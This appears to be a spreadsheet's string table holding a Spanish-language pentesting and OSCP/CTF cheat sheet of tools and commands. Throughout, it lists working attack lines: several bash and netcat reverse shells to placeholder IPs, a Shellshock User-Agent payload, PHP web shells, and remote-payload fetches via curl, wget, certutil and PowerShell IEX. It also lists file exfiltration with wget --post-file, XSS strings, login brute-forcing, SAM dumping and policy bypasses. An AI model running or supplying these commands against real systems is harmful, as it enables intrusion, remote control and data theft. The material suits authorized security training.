    <t>Dcode.fr</t>
  </si>
  <si>
    <t>Cyberchef</t>
  </si>
  <si>
    <t>Analisis de Malware hibrido</t>
  </si>
  <si>
    <t>no envia firmas</t>
  </si>
  <si>
    <t>CeWL</t>
  </si>
  <si>
    <t>DICCIONARIOS</t>
  </si>
  <si>
    <t>Truecrack</t>
  </si>
  <si>
    <t>Fuerza bruta a TrueCrypt</t>
  </si>
  <si>
    <t>Kaonashi</t>
  </si>
  <si>
    <t>Kaonashi20k Kanaji50.rule</t>
  </si>
  <si>
    <t>Npk gráficas password cracking</t>
  </si>
  <si>
    <t>Pagina que nos permite crackear hashes por GPU en AWS y se paga por lo que se consume</t>
  </si>
  <si>
    <t>Es de colafire</t>
  </si>
  <si>
    <t>Cryptbreaker GPU password cracking</t>
  </si>
  <si>
    <t>Mas o menos lo mismo Cracking con gpu en la nube AWS</t>
  </si>
  <si>
    <t>Se usa con Docker</t>
  </si>
  <si>
    <t>apt-get install crackmapexec</t>
  </si>
  <si>
    <t>Es una herramienta de post-explotación que ayuda a automatizar la evaluación de la seguridad en grandes redes con Active Directory</t>
  </si>
  <si>
    <t>SPARTA / LEGION</t>
  </si>
  <si>
    <t>ACTIVE DIRECTORY / DIRECTORIO ACTIVO</t>
  </si>
  <si>
    <t>CrackMapExec</t>
  </si>
  <si>
    <t>https://www.routerpasswords.com/</t>
  </si>
  <si>
    <t>Death Star</t>
  </si>
  <si>
    <t>EMPIRE</t>
  </si>
  <si>
    <t>./DeathStar.py -u empireadmin -p 1234</t>
  </si>
  <si>
    <t>python empire --rest --username empireadmin --password 1234</t>
  </si>
  <si>
    <t>Instalar Empire</t>
  </si>
  <si>
    <t>Instalar DeathStar</t>
  </si>
  <si>
    <t>sudo apt-get remove python3-pip; sudo apt-get install python3-pip</t>
  </si>
  <si>
    <t>pip2 install pefile</t>
  </si>
  <si>
    <t>Para buscar exploit de escalar privielgios</t>
  </si>
  <si>
    <t>auto_priv_exploit.sh o auto_searchsploit.py "version kernel"</t>
  </si>
  <si>
    <t>Buscar exploit para elevar privilegios poniendo el kernel de linux</t>
  </si>
  <si>
    <t>Para ver la version del kernel uname -r</t>
  </si>
  <si>
    <t xml:space="preserve">"&gt;&lt;ScRIPt&gt;aLeRT("XSS")&lt;/ScRIPt&gt;
</t>
  </si>
  <si>
    <t>"/&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;</t>
  </si>
  <si>
    <t>"/&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</t>
  </si>
  <si>
    <t>&lt;/SCRIPT&gt;"&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;</t>
  </si>
  <si>
    <t>%3C%2FSCRIPT%3E%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E</t>
  </si>
  <si>
    <t>%3C/SCRIPT%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E</t>
  </si>
  <si>
    <t>Retos, CTF, OSCP</t>
  </si>
  <si>
    <t>Data Exfiltration Toolkit</t>
  </si>
  <si>
    <t>DET</t>
  </si>
  <si>
    <t>DET Data Exfiltration Toolkit</t>
  </si>
  <si>
    <t>Hace falta un servidor fuera para conectarse</t>
  </si>
  <si>
    <t>Para hacer exfiltracion de datos de diferentes formas</t>
  </si>
  <si>
    <t>Punycode</t>
  </si>
  <si>
    <t>Concepto</t>
  </si>
  <si>
    <t>CONCEPTOS</t>
  </si>
  <si>
    <t>OAuth</t>
  </si>
  <si>
    <t>Enmascara la URL con caracteres muy parecidos al original</t>
  </si>
  <si>
    <t>Open Authorization, se pueden hacer ataques ver video Pablo gonzales hacking modulo 1 OSCP</t>
  </si>
  <si>
    <t>ippsec Youtube</t>
  </si>
  <si>
    <t>sticky keys</t>
  </si>
  <si>
    <t>winlogon se ejecuta como system y podemos cambiar la contraseña con net user</t>
  </si>
  <si>
    <t>chntpw</t>
  </si>
  <si>
    <t>sethc.exe</t>
  </si>
  <si>
    <t>QRLJacking</t>
  </si>
  <si>
    <t>Herramienta de OWASP para realizar phishing con codigos QR</t>
  </si>
  <si>
    <t>O podemos quitarle la contraseña a administrador</t>
  </si>
  <si>
    <t>PYTHON</t>
  </si>
  <si>
    <t>apt-get install 2to3</t>
  </si>
  <si>
    <t>-w para escribir los cambios con el mismo nombre y genera un .bak por si acaso la liamos</t>
  </si>
  <si>
    <t>pip</t>
  </si>
  <si>
    <t>pip3</t>
  </si>
  <si>
    <t>sudo pip install psycopg2</t>
  </si>
  <si>
    <t>Para manejar BD de Pogresql</t>
  </si>
  <si>
    <t>searchsploit</t>
  </si>
  <si>
    <t xml:space="preserve">echo "flag del smtp" | xxd -r -ps </t>
  </si>
  <si>
    <t>apt-get install terminator</t>
  </si>
  <si>
    <t>pwsh  para iniciar</t>
  </si>
  <si>
    <t>apt update &amp;&amp; apt -y install powershell</t>
  </si>
  <si>
    <t>pip install -r requirements.txt --user</t>
  </si>
  <si>
    <t>apt-get install m2crypto swig</t>
  </si>
  <si>
    <t>rm -rf /lib/firmware/b43*</t>
  </si>
  <si>
    <t>sudo apt-get purge firmware-b43-installer firmware-b43legacy-installer</t>
  </si>
  <si>
    <t>/etc/apt/sources.list</t>
  </si>
  <si>
    <t>getcountermeasure</t>
  </si>
  <si>
    <t>POWERSHELL</t>
  </si>
  <si>
    <t>iex(new-object  net.webclient).downloadstring('Script de Github')</t>
  </si>
  <si>
    <t>Descargar y cargar en memoria scripts</t>
  </si>
  <si>
    <t>Los scripts de Github tienen que estar en raw</t>
  </si>
  <si>
    <t>$PSVersionTable</t>
  </si>
  <si>
    <t>Para ver la version de powershell</t>
  </si>
  <si>
    <t>ls function:</t>
  </si>
  <si>
    <t>Set-ExecutionPolicy -Scope LocalMachine unrestricted</t>
  </si>
  <si>
    <t>import-module</t>
  </si>
  <si>
    <t>invoke-webrequest</t>
  </si>
  <si>
    <t>Nos devuelve una respuesta http como 200 de una pagina web</t>
  </si>
  <si>
    <t>-get-help funcion -examples</t>
  </si>
  <si>
    <t>-Out-String</t>
  </si>
  <si>
    <t>https://github.com/BC-SECURITY/Empire/</t>
  </si>
  <si>
    <t>https://www.bc-security.org/post/the-empire-3-0-strikes-back</t>
  </si>
  <si>
    <t>Empire 3.0 Covenant (creadores Empire)</t>
  </si>
  <si>
    <t>Get-help [nombre funcion] -full</t>
  </si>
  <si>
    <t>get-alias</t>
  </si>
  <si>
    <t>get-command</t>
  </si>
  <si>
    <t xml:space="preserve">/etc/init.d/postgresql start </t>
  </si>
  <si>
    <t>Iniciar BD PostgresQL</t>
  </si>
  <si>
    <t>systemctl is-enabled nombredelservicio</t>
  </si>
  <si>
    <t>systemctl enable nombredelservicio</t>
  </si>
  <si>
    <t>Comprobar si un servicio esta habilitado en el arranque</t>
  </si>
  <si>
    <t>exploit/windows/local/bypassuac_eventvwr</t>
  </si>
  <si>
    <t>searchsploit -e para resultados exactos</t>
  </si>
  <si>
    <t>show advanced</t>
  </si>
  <si>
    <t>get payload</t>
  </si>
  <si>
    <t>show targets</t>
  </si>
  <si>
    <t>msfconsole -r "archivoresource.rc"</t>
  </si>
  <si>
    <t>apt-get install micro</t>
  </si>
  <si>
    <t>uictl</t>
  </si>
  <si>
    <t>data/wordlist/postgres_default_pass.txt</t>
  </si>
  <si>
    <t>exploit-db has app</t>
  </si>
  <si>
    <t>setg</t>
  </si>
  <si>
    <t>setg RHOST 192.168.1.1</t>
  </si>
  <si>
    <t>tabulador</t>
  </si>
  <si>
    <t>Control R</t>
  </si>
  <si>
    <t>wpscan --disable-tls-checks</t>
  </si>
  <si>
    <t>WPSCAN</t>
  </si>
  <si>
    <t>DIRSEARCH</t>
  </si>
  <si>
    <t>dirsearch.py</t>
  </si>
  <si>
    <t>sudo -l</t>
  </si>
  <si>
    <t>hackersclub.academy/hca.iso</t>
  </si>
  <si>
    <t>https://github.com/pablogonzalezpe/metasploit-framework/tree/master/modules/exploits</t>
  </si>
  <si>
    <t>generate_payload_base64</t>
  </si>
  <si>
    <t>rumkin.com</t>
  </si>
  <si>
    <t>\! ls - all o /etc/passwd</t>
  </si>
  <si>
    <t>Mysql y MariaDB ejecutar comandos shell</t>
  </si>
  <si>
    <t>apt-get install rlwrap</t>
  </si>
  <si>
    <t>rlwrap nc -lvnp "puerto"</t>
  </si>
  <si>
    <t>locate 2john | greep ssh</t>
  </si>
  <si>
    <t>db_rebuild_cache</t>
  </si>
  <si>
    <t>show info</t>
  </si>
  <si>
    <t>jobs</t>
  </si>
  <si>
    <t>service apache2 start</t>
  </si>
  <si>
    <t>python3 -m http.server 8000</t>
  </si>
  <si>
    <t>Carga servidor con Python</t>
  </si>
  <si>
    <t>python3 phantom-evasion.py --setup</t>
  </si>
  <si>
    <t>packer UPX</t>
  </si>
  <si>
    <t>LinEnum</t>
  </si>
  <si>
    <t>https://github.com/rebootuser/LinEnum</t>
  </si>
  <si>
    <t>Script en Bash permite detectar vulnerabilidades por escalada de privilegios en Linux</t>
  </si>
  <si>
    <t>Sherlock.ps1 Find-Allvulns</t>
  </si>
  <si>
    <t>Detecta parches faltantes que permitan escalada de privilegios en Windows</t>
  </si>
  <si>
    <t>Nueva version de Sherlock para W10</t>
  </si>
  <si>
    <t>https://github.com/rasta-mouse/Watson</t>
  </si>
  <si>
    <t>Watson</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/Veil-Framework/Veil</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/lanjelot/patator</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/guelfoweb/knock</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; wget https://github.com/gophish/gophish/releases/download/v0.9.0/gophish-v0.9.0-linux-64bit.zip</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/wifiphisher/wifiphisher.git &amp;&amp; apt-get install libnl-3-dev libnl-genl-3-dev &amp;&amp; cd wifiphiser &amp;&amp; sudo python3 setup.py install</t>
  </si>
  <si>
    <t xml:space="preserve">cd /opt &amp;&amp; git clone https://github.com/EmpireProject/Empire &amp;&amp; cd Empire/setup &amp;&amp; ./install.sh &amp;&amp; pip2 install pefile &amp;&amp; cd .. 
</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/byt3bl33d3r/DeathStar &amp;&amp; cd DeathStar &amp;&amp; sudo apt-get remove python3-pip; sudo apt-get install python3-pip &amp;&amp; pip3 install -r requirements.txt</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/ngalongc/AutoLocalPrivilegeEscalation</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/sensepost/DET.git</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/oddcod3/Phantom-Evasion</t>
  </si>
  <si>
    <t>python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSION&gt;</t>
  </si>
  <si>
    <t>python -m SimpleHTTPServer 8000</t>
  </si>
  <si>
    <t>/usr/bin/perl -e 'exec "/bin/sh"'</t>
  </si>
  <si>
    <t>SHELLS</t>
  </si>
  <si>
    <t>/usr/share/webshells/php/php-reverse-shell.php</t>
  </si>
  <si>
    <t>--interactive !sh</t>
  </si>
  <si>
    <t xml:space="preserve">which </t>
  </si>
  <si>
    <t>wget --no-check-certificate</t>
  </si>
  <si>
    <t>cp .</t>
  </si>
  <si>
    <t xml:space="preserve"> chown usuario:usuario -R root/</t>
  </si>
  <si>
    <t>CHEATSHEET</t>
  </si>
  <si>
    <t>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</t>
  </si>
  <si>
    <t>https://book.hacktricks.xyz/stego/stego-tricks</t>
  </si>
  <si>
    <t>https://pequalsnp-team.github.io/cheatsheet/steganography-101</t>
  </si>
  <si>
    <t>SEARCHSPLOIT</t>
  </si>
  <si>
    <t xml:space="preserve">searchsploit -p "ID" </t>
  </si>
  <si>
    <t>ls -la</t>
  </si>
  <si>
    <t>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-form-post "/pagina/login.php:username=^USER^&amp;^PASS^:Invalid Password" -t 64 -V</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;?php system("wget http://10.10.10.10/shell_reversa.txt -O /tmp/shell_reversa.php; php /tmp/shell_reversa.php"); ?&gt; </t>
  </si>
  <si>
    <t>wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://localhost/FUZZ</t>
  </si>
  <si>
    <t>WFUZZ</t>
  </si>
  <si>
    <t>-c para color -L para que haga redirect 404 para que no muestre los que no existen -t para aumentar los hilos</t>
  </si>
  <si>
    <t>--hh=157 nos oculta un determinado tamaño de la peticion en Wfuzz</t>
  </si>
  <si>
    <t>Control I</t>
  </si>
  <si>
    <t>Control shift U</t>
  </si>
  <si>
    <t>WORDPRESS</t>
  </si>
  <si>
    <t>Linux Enumeration &amp; Privilege Escalation Checks</t>
  </si>
  <si>
    <t>lse.sh -1</t>
  </si>
  <si>
    <t>TTL</t>
  </si>
  <si>
    <t xml:space="preserve">desbloquear root en kali 2020 </t>
  </si>
  <si>
    <t>sudo passwd root</t>
  </si>
  <si>
    <t>sudo passwd -u root</t>
  </si>
  <si>
    <t>en xfce ya estaria para gnome</t>
  </si>
  <si>
    <t>sudo nano /etc/pam.d/gdm-autologin # auth required</t>
  </si>
  <si>
    <t>sudo nano /etc/pam.d/gdm-password # auth required</t>
  </si>
  <si>
    <t>cuando invocamos o importamos una shell con python TERM=screen-256color</t>
  </si>
  <si>
    <t>control Z</t>
  </si>
  <si>
    <t>stty raw -echo</t>
  </si>
  <si>
    <t>fg</t>
  </si>
  <si>
    <t>enter</t>
  </si>
  <si>
    <t>export TERM=screen</t>
  </si>
  <si>
    <t>for x in knock1 knock2 knock3; do nmap -Pn --max-retries 0 -p $x 10.10.10.10; done</t>
  </si>
  <si>
    <t>Herramienta para port knocking</t>
  </si>
  <si>
    <t>directorio report</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/maurosoria/dirsearch</t>
  </si>
  <si>
    <t>searchsploit -x</t>
  </si>
  <si>
    <t>dirsearch -r -R 3</t>
  </si>
  <si>
    <t>SHELLSHOCK</t>
  </si>
  <si>
    <t xml:space="preserve"> User-Agent: () { :; }; bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1</t>
  </si>
  <si>
    <t>fastTCPScan</t>
  </si>
  <si>
    <t>fastTCPScan -host=10.10.10.10 -threads=200 2&gt;/dev/null</t>
  </si>
  <si>
    <t>python patator.py http_fuzz url="10.10.10.10/login.php" method=POST body='username=admin&amp;password=FILE0' 0=/usr/share/wordlists/rockyou -x ignore:fgrep=Invalid Password"</t>
  </si>
  <si>
    <t>username=admin&amp;password[]=admin</t>
  </si>
  <si>
    <t>wfuzz  -c --hc=404 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions.txt htt://10.10.10.10/cgi-bin/FUZZ.FUZ2Z</t>
  </si>
  <si>
    <t>witch comando nos da la ruta absoluta del ejecutable</t>
  </si>
  <si>
    <t>https://ired.team/offensive-security-experiments/offensive-security-cheetsheets</t>
  </si>
  <si>
    <t>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</t>
  </si>
  <si>
    <t>gtfobins.github.io</t>
  </si>
  <si>
    <t>grep -v</t>
  </si>
  <si>
    <t>KNOCK</t>
  </si>
  <si>
    <t>knock 10.10.10.10 571:tcp 290:tcp 911:tcp</t>
  </si>
  <si>
    <t>apt-get install knockd</t>
  </si>
  <si>
    <t>Lo mismo de arriba</t>
  </si>
  <si>
    <t>curl</t>
  </si>
  <si>
    <t>curl 10.10.10.10/shell.txt|php</t>
  </si>
  <si>
    <t>du -hc</t>
  </si>
  <si>
    <t>nohup</t>
  </si>
  <si>
    <t>GITHUB</t>
  </si>
  <si>
    <t>curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1'" http://IPvictima/cgi-bin/recurso_vulnerable</t>
  </si>
  <si>
    <t>bash -c "bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 &gt;&amp;1"</t>
  </si>
  <si>
    <t>nmap -sR es como rpcinfo -</t>
  </si>
  <si>
    <t>git pull upstream master</t>
  </si>
  <si>
    <t>git pull</t>
  </si>
  <si>
    <t>id</t>
  </si>
  <si>
    <t>https://blog.stealthbits.com/next-gen-open-source-c2-frameworks/</t>
  </si>
  <si>
    <t>PROC NET TCP</t>
  </si>
  <si>
    <t>/proc/net/tcp</t>
  </si>
  <si>
    <t>apt-get install at</t>
  </si>
  <si>
    <t xml:space="preserve">at hora, nos permite programar una tarea para ejecutarla por linea de comandos, se diferencia de cron en que solo se ejecuta 1 vez </t>
  </si>
  <si>
    <t>systemctl start atd (para iniciar el proceso) control D (para terminar de definir la tarea)</t>
  </si>
  <si>
    <t>tail -f test.txt</t>
  </si>
  <si>
    <t>crontab -l</t>
  </si>
  <si>
    <t>ssh -i id_rsa usuario@IP</t>
  </si>
  <si>
    <t>ssh -R 4646:127.0.0.1:22 usuariolocal@IPLOCAL</t>
  </si>
  <si>
    <t>svwar</t>
  </si>
  <si>
    <t>-fNT</t>
  </si>
  <si>
    <t>DRUPAL</t>
  </si>
  <si>
    <t>FTP</t>
  </si>
  <si>
    <t>wget -r ftp://anonymous:loquesea@10.10.10.10</t>
  </si>
  <si>
    <t>tree -a para ver contenido oculto</t>
  </si>
  <si>
    <t>tr -d '\n'</t>
  </si>
  <si>
    <t>cat /var/mail/usuario</t>
  </si>
  <si>
    <t xml:space="preserve"># </t>
  </si>
  <si>
    <t># deb cdrom:[Debian GNU/Linux 2019.4 _Kali-rolling_ - Official Snapshot amd64 LIVE/INSTALL Binary 20191125-11:08]/ kali-last-snapshot contrib main non-free</t>
  </si>
  <si>
    <t>#deb cdrom:[Debian GNU/Linux 2019.4 _Kali-rolling_ - Official Snapshot amd64 LIVE/INSTALL Binary 20191125-11:08]/ kali-last-snapshot contrib main non-free</t>
  </si>
  <si>
    <t>deb http://http.kali.org/kali kali-rolling main non-free contrib</t>
  </si>
  <si>
    <t># deb-src http://http.kali.org/kali kali-rolling main non-free contrib</t>
  </si>
  <si>
    <t>LXD</t>
  </si>
  <si>
    <t xml:space="preserve">chmod +x </t>
  </si>
  <si>
    <t>cat /etc/login.defs | grep "ECRYPT_METHOD"</t>
  </si>
  <si>
    <t>bash.rc para crear funciones como la de extracion de puertos</t>
  </si>
  <si>
    <t xml:space="preserve">como en go añadir extract port en sources rc </t>
  </si>
  <si>
    <t>PSPY64</t>
  </si>
  <si>
    <t>https://github.com/DominicBreuker/pspy</t>
  </si>
  <si>
    <t>/root/.bashrc</t>
  </si>
  <si>
    <t>python3 -m http.server 8000 -d /opt</t>
  </si>
  <si>
    <t>python -m pyftpdlib -21 -w</t>
  </si>
  <si>
    <t>pip install pyftpdlib si no esta instalado</t>
  </si>
  <si>
    <t xml:space="preserve">php -S 0.0.0.0:8080 </t>
  </si>
  <si>
    <t>&lt;?php</t>
  </si>
  <si>
    <t>echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;";</t>
  </si>
  <si>
    <t>?&gt;</t>
  </si>
  <si>
    <t>https://github.com/KAIT07/OSCP-PREPARATION-THM</t>
  </si>
  <si>
    <t>https://redteams.fr/priv_escalation/</t>
  </si>
  <si>
    <t>https://cs.piosky.fr/exploit/unix/reverse_shell/</t>
  </si>
  <si>
    <t>Maquinas explicadas en Español</t>
  </si>
  <si>
    <t>crackstation</t>
  </si>
  <si>
    <t>apt-get install authbin -y</t>
  </si>
  <si>
    <t>wfuzz -c -z range, 1-65535 "URL:FUZZ"</t>
  </si>
  <si>
    <t>stty -a copiar row y colums y le quitamos el punto y coma del medio stty rows "n" colums "n"</t>
  </si>
  <si>
    <t>nmap -p 445 --script=smb-vuln* o tambien --script=vuln</t>
  </si>
  <si>
    <t>nmap --scripts "vuln and safe" -p 445 10.10.10.10 -oN vulnScan</t>
  </si>
  <si>
    <t>hashes.org</t>
  </si>
  <si>
    <t xml:space="preserve"> | sort -u</t>
  </si>
  <si>
    <t>cme Crack Map Exec</t>
  </si>
  <si>
    <t xml:space="preserve">cme smb 10.10.10.10 -u 'usuario' -p 'contraseña' --sam </t>
  </si>
  <si>
    <t>cme smb 10.10.10.10 -u 'usuario' -p 'contraseña' -x \\10.10.10.10\smbFolder\nc.exe -e cmd 10.10.10.10 4646</t>
  </si>
  <si>
    <t>Ejecutar un Netcat en un servidor con un recurso compartido</t>
  </si>
  <si>
    <t>cme pth-winexe -U WORKGROUP/Administrators%hash de la contraseña //10.10.10.10 cmd.ex</t>
  </si>
  <si>
    <t>frackzip -uDp/usr/share/wordlists/rockyou.txt "arhivozip"</t>
  </si>
  <si>
    <t>SMB</t>
  </si>
  <si>
    <t>smbmap -H 10.10.10.10 -u 'null'</t>
  </si>
  <si>
    <t>smbclient //10.10.10.10/Users -N</t>
  </si>
  <si>
    <t>for file in $(ls); do echo $file; done | grep -v -i "^ntsuser" | while read line; do echo -e "\n[*] $line:\n"; smbcacls //10.10.10.10/Users Default/Desktop -N | grep -i everyone</t>
  </si>
  <si>
    <t>En Windows cuando nos conectamos por SMB para ver los permisos reales que tenemos</t>
  </si>
  <si>
    <t>smbcacls //10.10.10.10/Users Default/Desktop -N | grep -i everyone</t>
  </si>
  <si>
    <t>mount -t cifs //10.10.10.10/Users /mnt/smbmounted -o username=null,password=null,domain=WORKGROUP,rw</t>
  </si>
  <si>
    <t>ls -laR</t>
  </si>
  <si>
    <t>Nos muestra tambien los archivos ocultos</t>
  </si>
  <si>
    <t>watch -n 1 ls -l /bin/bash</t>
  </si>
  <si>
    <t>watch -n 1 du -hc "archivo"</t>
  </si>
  <si>
    <t>reg save HKLM\SAM sam.backup</t>
  </si>
  <si>
    <t>reg save HKLM\SYSTEM system.backup</t>
  </si>
  <si>
    <t>Guardar una copia de la SAM</t>
  </si>
  <si>
    <t>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</t>
  </si>
  <si>
    <t>Activar RDP por registro</t>
  </si>
  <si>
    <t>net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL</t>
  </si>
  <si>
    <t>net localgroup "Remote Desktop Users" "usuario" /add</t>
  </si>
  <si>
    <t xml:space="preserve">file "archivo" </t>
  </si>
  <si>
    <t xml:space="preserve">[Environment]::Is64BitOperatingSystem </t>
  </si>
  <si>
    <t>[Environment]::Is64BitProcess</t>
  </si>
  <si>
    <t>start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/IP.ps1')</t>
  </si>
  <si>
    <t>New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\10.10.10.10\smbFolder"</t>
  </si>
  <si>
    <t>dir SharedFolder:\</t>
  </si>
  <si>
    <t>export HOME=/root y luego lo referenciamos con ~</t>
  </si>
  <si>
    <t>ByPass Listas negras</t>
  </si>
  <si>
    <t>curl -H "User-Agent: Dirbuster "http;//10.10.10.10.8000/</t>
  </si>
  <si>
    <t>Donde Dirbuster es el agente en lista negra</t>
  </si>
  <si>
    <t>find \-name *config*</t>
  </si>
  <si>
    <t>ltrace</t>
  </si>
  <si>
    <t>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</t>
  </si>
  <si>
    <t>CORREO IMAP POP</t>
  </si>
  <si>
    <t>list</t>
  </si>
  <si>
    <t>smtp-user-enum -M VRFY -u root -t 192.168.1.25</t>
  </si>
  <si>
    <t>smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.</t>
  </si>
  <si>
    <t>https://tools.kali.org/information-gathering/smtp-user-enum</t>
  </si>
  <si>
    <t>Verificar si existe la lista de usuarios</t>
  </si>
  <si>
    <t>impacket-secretdump -system "archivo.bin" -ntds "archivo.dit"</t>
  </si>
  <si>
    <t>LOCAL que son copias de BD de datos de active directory</t>
  </si>
  <si>
    <t>impacket-smbserver smbFolder $(pwd)</t>
  </si>
  <si>
    <t>IMPACKET</t>
  </si>
  <si>
    <t>rbash shell registringida de bash</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/DominicBreuker/pspy</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/SecureAuthCorp/impacket</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/grongor/knock</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/rebootuser/LinEnum</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/diego-treitos/linux-smart-enumeration</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/rasta-mouse/Watson</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/3ndG4me/AutoBlue-MS17-010</t>
  </si>
  <si>
    <t>Para realizar Ethernal blue</t>
  </si>
  <si>
    <t>TOMCAT</t>
  </si>
  <si>
    <t>msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.10.10 lport=8888 -f war &gt; archivo.war</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/worawit/MS17-010</t>
  </si>
  <si>
    <t>zzz exploit Ethernal Blue con Pipes</t>
  </si>
  <si>
    <t>zzz_exploit.py</t>
  </si>
  <si>
    <t>nishang</t>
  </si>
  <si>
    <t>Framework completo de powershell</t>
  </si>
  <si>
    <t>CERTUTIL</t>
  </si>
  <si>
    <t>certutil.exe -f -urlcache -split http://10.10.10.10:8000/recurso.exe recurso.exe</t>
  </si>
  <si>
    <t>Es para descargar y validar certificados pero tiene un bug que puedes descargar cualquier cosa como malware</t>
  </si>
  <si>
    <t>install python-xlrd, $ pip install xlrd --upgrade</t>
  </si>
  <si>
    <t>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</t>
  </si>
  <si>
    <t>python wes.py --update &amp;&amp; python wes.py systeminfo.txt -i "Elevation of Privilege"</t>
  </si>
  <si>
    <t>./windows-exploit-suggester.py --update &amp;&amp; ./windows-exploit-suggester.py --database "nombre de la bd del update " --systeminfo "systeminfo.txt"</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; git clone https://github.com/PowerShellMafia/PowerSploit</t>
  </si>
  <si>
    <t>Framework Powershell Pentesting</t>
  </si>
  <si>
    <t>| xargs  x</t>
  </si>
  <si>
    <t>find \-user Jimmy 2&gt;/dev/null</t>
  </si>
  <si>
    <t xml:space="preserve">man ascii </t>
  </si>
  <si>
    <t>control R control X reset; sh 1&gt;&amp;0 2&gt;&amp;0</t>
  </si>
  <si>
    <t>Abrir una shell en Nano</t>
  </si>
  <si>
    <t>nmap --script ssl-heartbleed</t>
  </si>
  <si>
    <t>Ver si es vulnerable a Heatbleed</t>
  </si>
  <si>
    <t>SSLSCAN</t>
  </si>
  <si>
    <t>sslscan "ip"</t>
  </si>
  <si>
    <t>hashid</t>
  </si>
  <si>
    <t>hashidentifier</t>
  </si>
  <si>
    <t>Lo mismo</t>
  </si>
  <si>
    <t>Wget / Curl</t>
  </si>
  <si>
    <t>curl -k</t>
  </si>
  <si>
    <t>SSH -L 4444:127.0.0.1:5901 "usuariossh"@"IP"</t>
  </si>
  <si>
    <t>scp "usuariossh"@"IP":/"recurso que queremos" "donde guardar"</t>
  </si>
  <si>
    <t>sudo wget --post-file /root/root.txt http://"IP maquina donde se descargue la flag"</t>
  </si>
  <si>
    <t>pfexec bash</t>
  </si>
  <si>
    <t xml:space="preserve">Comprobar en cat /etc/user_attr </t>
  </si>
  <si>
    <t>hashcat -m 7400 hashes.txt rockyou.txt --force</t>
  </si>
  <si>
    <t>7400 es el metodo de cifrado, hay que ver la lista en la pagina oficial con las ID</t>
  </si>
  <si>
    <t>Crackeo de Hashes con Hashcat</t>
  </si>
  <si>
    <t>-t '/bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</t>
  </si>
  <si>
    <t>REG / NET</t>
  </si>
  <si>
    <t>netstat -nat | grep "puerto"</t>
  </si>
  <si>
    <t xml:space="preserve">xxd -r -p "archivo" </t>
  </si>
  <si>
    <t>man crypt</t>
  </si>
  <si>
    <t>/var/log/httpd-access.log&amp;c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</t>
  </si>
  <si>
    <t>LFI hacer Log poison inyectando una shell en el User Agent</t>
  </si>
  <si>
    <t>&lt;?php system($_GET['c']); ?&gt;</t>
  </si>
  <si>
    <t>openssl passwd "contraseña"</t>
  </si>
  <si>
    <t xml:space="preserve">al levantar un power shell poner -ep para hacer un bypass de politica </t>
  </si>
  <si>
    <t>powershell.exe -v 2</t>
  </si>
  <si>
    <t>powershell.exe "parametro" -EncodedCommand</t>
  </si>
  <si>
    <t>Ofuscacion simple del parametro que le pasamos</t>
  </si>
  <si>
    <t>tambien funciona con -e</t>
  </si>
  <si>
    <t>cat "script" | iex</t>
  </si>
  <si>
    <t>iex invoke-expresion va ejecutando lo que le vamos pasando</t>
  </si>
  <si>
    <t>Para hacer Bypass con pipes</t>
  </si>
  <si>
    <t>powershell.exe -ep bypass</t>
  </si>
  <si>
    <t>https://github.com/shr3ddersec/Shr3dKit#data-exfiltration</t>
  </si>
  <si>
    <t>https://github.com/infosecn1nja/Red-Teaming-Toolkit</t>
  </si>
  <si>
